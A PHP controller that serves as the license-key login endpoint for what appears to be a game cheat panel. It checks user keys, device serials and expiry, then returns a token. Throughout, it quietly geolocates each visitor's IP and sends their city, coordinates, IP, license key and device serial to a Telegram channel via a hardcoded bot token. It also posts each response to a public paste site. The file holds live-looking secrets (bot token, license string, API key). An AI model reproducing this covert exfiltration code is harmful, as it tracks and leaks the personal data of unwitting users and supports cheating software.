<?php

namespace App\Controllers;

use App\Models\KeysModel;
use App\Models\CodeModel;
use App\Models\Server;
use App\Models\Status;
use App\Models\_ftext;
use App\Models\HistoryModel;
use App\Models\UserModel;
use CodeIgniter\Config\Services;
use CodeIgniter\Controller;

class Genpass extends BaseController
{
    protected $model, $game, $uKey, $sDev;

    public function __construct()
    {
        include('conn.php');
        
        $sql1 ="select * from onoff where id=11";
        $result1 = mysqli_query($conn, $sql1);
        $userDetails1 = mysqli_fetch_assoc($result1);
        
        $this->model = new KeysModel();
        
        if($userDetails1['status'] == 'on'){
        
        $this->maintenance = false;
        
        }
        if($userDetails1['status'] == 'off'){
        
        $this->maintenance = true;
        
        }
        
        
        $this->staticWords = "Vm8Lk7Uj2JmsjCPVPVjrLa7zgfx3uz9E";
    }

    public function index()
    {
        if ($this->request->getPost()) {
            return $this->index_post();
        } else {
  if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on'){
         $url = "https://";   
   } else  {
         $url = "http://";   }
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];    
      

    $ip = $_SERVER['REMOTE_ADDR']; // your ip address here
    $query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
    if($query && $query['status'] == 'success')
    {
            $haul = '𝗖𝗟𝗜𝗘𝗡𝗧 𝗖𝗜𝗧𝗬 - ' . $query['city']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗦𝗧𝗔𝗧𝗘 - ' . $query['region']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗭𝗜𝗣𝗖𝗢𝗗𝗘 - ' . $query['zip']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗖𝗢𝗢𝗥𝗗𝗜𝗡𝗔𝗧𝗘𝗦 - ' . $query['lat'] . ', ' . $query['lon']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗡𝗘𝗧𝗪𝗢𝗥𝗞 - ' . $query['as']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗧𝗜𝗠𝗘𝗭𝗢𝗡𝗘 - ' . $query['timezone']."\n".'CURRENY PAGE URL - ' . $url."\n".'IP ADDRESS - ' . $ip;
  $apiToken = "5982824943:AAHV66f0xTTexZwW5qyYBZ3kO7EghOKslB0";
  $data = [
      'chat_id' => '@kaurolop',
      'text' => $haul
  ];
  $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );


    }
            $nata = [
                "web_info" => [
                "MADE_BY" => "@PBARMYF",
                    "_client" => BASE_NAME,
                    "license" => "Qp5KSGTquetnUkjX6UVBAURH8hTkZuLM",
                    "version" => "1.0.0",
                ],
                "web__dev" => [
                    "author" => "@SILENTXCHEAT",
                    "telegram" => "https://t.me/SILENTXCHEAT"
                           ],
            ];
            
            return create_password("123456");
        }
    }
    public function index_post()
    {
    
        $isMT = $this->maintenance;
        $game = $this->request->getPost('game');
        $uKey = $this->request->getPost('user_key');
        $sDev = $this->request->getPost('serial');

    



        $form_rules = [
            'game' => 'required|alpha_dash',
            'user_key' => 'required|alpha_numeric|min_length[1]|max_length[36]',
            'serial' => 'required|alpha_dash'
        ];

        if (!$this->validate($form_rules)) {
            $data = [
                'status' => false,
                'reason' => "Bad Parameter",
            ];
            return $this->response->setJSON($data);
        }

        if ($isMT) {
            
            include('conn.php');
        
            $sql1 ="select * from onoff where id=11";
            $result1 = mysqli_query($conn, $sql1);
            $userDetails1 = mysqli_fetch_assoc($result1);
        
            
            $data = [
                'status' => false,
                'reason' => $userDetails1['myinput']
            ];
        } else {
            if (!$game or !$uKey or !$sDev) {
                $data = [
                    'status' => false,
                    'reason' => 'INVALID PARAMETER'
                ];
            } else {
                $time = new \CodeIgniter\I18n\Time;
                $model = $this->model;
                $findKey = $model
                    ->getKeysGame(['user_key' => $uKey, 'game' => $game]);

                if ($findKey) {
                    if ($findKey->status != 1) {
                        $data = [
                            'status' => false,
                            'reason' => 'USER BLOCKED'
                        ];
                    } else {
                        $id_keys = $findKey->id_keys;
                        $duration = $findKey->duration;
                        $expired = $findKey->expired_date;
                        $max_dev = $findKey->max_devices;
                        $devices = $findKey->devices;
    
                        function checkDevicesAdd($serial, $devices, $max_dev)
                        {
                            $lsDevice = explode(",", $devices);
                            $cDevices = isset($devices) ? count($lsDevice) : 0;
                            $serialOn = in_array($serial, $lsDevice);
    
                            if ($serialOn) {
                                return true;
                            } else {
                                if ($cDevices < $max_dev) {
                                    array_push($lsDevice, $serial);
                                    $setDevice = reduce_multiples(implode(",", $lsDevice), ",", true);
                                    return ['devices' => $setDevice];
                                } else {
                                    // ! false - devices max
                                    return false;
                                }
                            }
                        }
    
                        if (!$expired) {
                            $setExpired = $time::now()->addDays($duration);
                            $model->update($id_keys, ['expired_date' => $setExpired]);
                            $data['status'] = true;
                        } else {
                            if ($time::now()->isBefore($expired)) {
                                $data['status'] = true;
                            } else {
                                $data = [
                                    'status' => false,
                                    'reason' => 'EXPIRED KEY'
                                ];
                            }
                        }
    
                        if ($data['status']) {
                            
                            include('conn.php');
        
                            $sql2 ="select * from modname where id=1";
                            $result2 = mysqli_query($conn, $sql2);
                            $userDetails2 = mysqli_fetch_assoc($result2);
                            
                            $sql3 ="select * from _ftext where id=1";
                            $result3 = mysqli_query($conn, $sql3);
                            $userDetails3 = mysqli_fetch_assoc($result3);
        
        
                            
                            $devicesAdd = checkDevicesAdd($sDev, $devices, $max_dev);
                            if ($devicesAdd) {
                                if (is_array($devicesAdd)) {
                                    $model->update($id_keys, $devicesAdd);
                                }
                                // ? game-user_key-serial-word di line 15
                                $real = "$game-$uKey-$sDev-$this->staticWords";
                                $data = [
                                    'status' => true,
                                    'data' => [
                                        // 'real' => $real,
                                        'token' => md5($real),
                                        'MOD_NAME' => $userDetails2['modname'],
                                        'MOD_STATUS' => $userDetails3['_status'],
                                        'FLOTING_TEST' => $userDetails3['_ftext'],
                                        'EXPIRY' => $expired,
                                        'MAX_DEVICES'=> $max_dev,
                                        'rng' => $time->getTimestamp()
                                    ],
                                ];
                            } else {
                                $data = [
                                    'status' => false,
                                    'reason' => 'MAX DEVICE REACHED'
                                ];
                            }
                        }
                    }
                } else {
                    $data = [
                        'status' => false,
                        'reason' => 'USER OR GAME NOT REGISTERED'
                    ];
                }
            }
        }
        
              /*  $ua=$_SERVER['HTTP_USER_AGENT'];
$query = http_build_query([
  'access_key' => 'ef4442f2b757f9013615cdca436310e0',
  'ua' => $ua,
]);

$ch = curl_init('http://api.userstack.com/detect?' . $query);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$json = curl_exec($ch);
curl_close($ch);

$api_result = json_decode($json, true);

$name = $api_result['brand']." ".$api_result['name'];

*/
        
$ch = curl_init(); 
	    curl_setopt($ch, CURLOPT_URL,            "https://hastebin.com/documents" );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
        curl_setopt($ch, CURLOPT_POST,           1 );
        curl_setopt($ch, CURLOPT_POSTFIELDS, array('data'=>json_encode($data, JSON_PRETTY_PRINT)));
        curl_setopt($ch, CURLOPT_HTTPHEADER,     array('Content-Type: multipart/form-data'));
        $response_json = curl_exec($ch);
        curl_close($ch);
        $response_array = json_decode($response_json,true);



$rpos = json_decode($response_json)->key;
$rspos = "https://hastebin.com/raw/".$rpos;
        
        if ($data['status']){
          if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on'){
         $url = "https://";   
   } else  {
         $url = "http://";   }
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];    
      

    $ip = $_SERVER['REMOTE_ADDR']; // your ip address here
    $query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
    if($query && $query['status'] == 'success')
    {
            $haul = '𝗖𝗟𝗜𝗘𝗡𝗧 𝗖𝗜𝗧𝗬 - ' . $query['city']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗦𝗧𝗔𝗧𝗘 - ' . $query['region']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗭𝗜𝗣𝗖𝗢𝗗𝗘 - ' . $query['zip']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗖𝗢𝗢𝗥𝗗𝗜𝗡𝗔𝗧𝗘𝗦 - ' . $query['lat'] . ', ' . $query['lon']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗡𝗘𝗧𝗪𝗢𝗥𝗞 - ' . $query['as']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗧𝗜𝗠𝗘𝗭𝗢𝗡𝗘 - ' . $query['timezone']."\n".'𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗣𝗔𝗚𝗘 𝗨𝗥𝗟 - ' . $url."\n".'𝗞𝗘𝗬 𝗥𝗘𝗣𝗢𝗡𝗦𝗘 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 :- ' . $rspos."\n".'𝐊𝐄𝐘 :- ' . "<tg-spoiler>" .  $uKey. "</tg-spoiler>" . "\n".'𝐒𝐄𝐑𝐈𝐀𝐋 𝐍𝐎. - ' . "<pre>" . $sDev."</pre>"."\n".'𝐊𝐄𝐘 𝐒𝐓𝐀𝐓𝐔𝐒 :- ' . "<b>SUCCESSFULLY LOGGED IN</b>"."\n".'IP ADDRESS - ' . $ip;
  $apiToken = "5982824943:AAHV66f0xTTexZwW5qyYBZ3kO7EghOKslB0";
  $daata = [
      'chat_id' => '@kaurolop',
      'text' => $haul
  ];
  $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?parse_mode=html&" .
                                 http_build_query($daata) );


    }
        } else {
        
        if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on'){
         $url = "https://";   
   } else  {
         $url = "http://";   }
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];    
      

    $ip = $_SERVER['REMOTE_ADDR']; // your ip address here
    $query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
    if($query && $query['status'] == 'success')
    {
            $haul = '𝗖𝗟𝗜𝗘𝗡𝗧 𝗖𝗜𝗧𝗬 - ' . $query['city']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗦𝗧𝗔𝗧𝗘 - ' . $query['region']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗭𝗜𝗣𝗖𝗢𝗗𝗘 - ' . $query['zip']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗖𝗢𝗢𝗥𝗗𝗜𝗡𝗔𝗧𝗘𝗦 - ' . $query['lat'] . ', ' . $query['lon']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗡𝗘𝗧𝗪𝗢𝗥𝗞 - ' . $query['as']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗧𝗜𝗠𝗘𝗭𝗢𝗡𝗘 - ' . $query['timezone']."\n".'𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗣𝗔𝗚𝗘 𝗨𝗥𝗟 - ' . $url."\n".'𝗞𝗘𝗬 𝗥𝗘𝗣𝗢𝗡𝗦𝗘 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 :- ' . $rspos."\n".'𝐊𝐄𝐘 :- ' . "<tg-spoiler>" .  $uKey. "</tg-spoiler>" . "\n".'𝐒𝐄𝐑𝐈𝐀𝐋 𝐍𝐎. - ' . "<pre>" . $sDev."</pre>"."\n".'𝐊𝐄𝐘 𝐒𝐓𝐀𝐓𝐔𝐒 :- ' . "<b>".$data['reason']."</b>"."\n".'IP ADDRESS - ' . $ip;
  $apiToken = "5982824943:AAHV66f0xTTexZwW5qyYBZ3kO7EghOKslB0";
  $daata = [
      'chat_id' => '@kaurolop',
      'text' => $haul
  ];
  $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?parse_mode=html&" .
                                 http_build_query($daata) );


    }
        
        }
        return $this->response->setJSON($data);
    }
}
